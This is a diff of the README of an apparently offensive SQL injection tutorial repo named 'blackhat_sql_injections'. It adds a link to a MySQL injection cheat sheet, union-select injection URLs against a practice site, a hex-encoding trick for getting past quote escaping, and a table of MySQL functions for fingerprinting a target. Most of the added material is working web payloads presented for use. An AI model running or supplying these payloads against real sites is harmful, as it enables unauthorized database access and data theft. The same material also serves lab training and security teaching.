@@ -8,6 +8,8 @@ Hello my friends, this is my repo about sql injections.
 
 Thanks for all: Zenodermus Javanicus, @zc00l, @LowFuel 
 
+:point_right: [SQL-Injection-Cheat-Sheet-MySQL](https://github.com/0xC2-0xC2/blackhat_sql_injections/blob/master/SQL_Injection_Cheat_Sheet_MySQL.md)
+
 References:
 
  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
@@ -173,6 +175,43 @@ http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1000000' union select 1,
 http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=null' union select 1,@@version,3--+
 
 http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1' && 0 union select 1,@@version,3--+
+
+```
+
+ Still some times if the programmer is using `mysql_real_escape_string` it may create an error or else no output. We can simply avoid the usage of single quotes using `hex values`. Below is the encoded query for the above same query.
+
+```
+http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1' union select '1','2','3'--+
+
+http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1' union select 1,2,3--+
+
+http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1' union select 0x31,0x32,0x33--+
+
+```
+
+One small thing to remember is that always add `0x` before any hexadecimal value. Hopefully the above query should work and you will find the column which is getting printed on the webpage or inside the source code. We will stich up with 3rd column for this example. As we know that any thing on place of third column is getting printed. Then now we can try some Default functions and variables, to get some information related to our target. Below are some of the `Variables/Functions` that can be used to `get information` about your target machine.
+
+```
++-------------------------------------------------------------------------------------+
+|          Variable/Function               |              Output                      |
++------------------------------------------+------------------------------------------+
+| @@hostname	                           :	Current Hostname                      |
+| @@tmpdir	                           :	Temp Directory                        |
+| @@datadir	                           :	Data Directory                        |
+| @@version	                           :	Version of DB                         |
+| @@basedir	                           :	Base Directory                        |
+| user()	                           :	Current User                          |
+| database()	                           :	Current Database                      |
+| version()	                           :	Version                               |
+| schema()	                           :	current Database                      |
+| UUID()	                           :	System UUID key                       |
+| current_user()	                   :	Current User                          |
+| current_user	                           :	Current User                          |
+| system_user()	                           :	Current Sustem user                   |
+| session_user()	                   :	Session user                          |
+| @@GLOBAL.have_symlink	                   :	Check if Symlink Enabled or Disabled  |
+| @@GLOBAL.have_ssl	                   :	Check if it have ssl or not           |
++-------------------------------------------------------------------------------------+
 
 ```
 
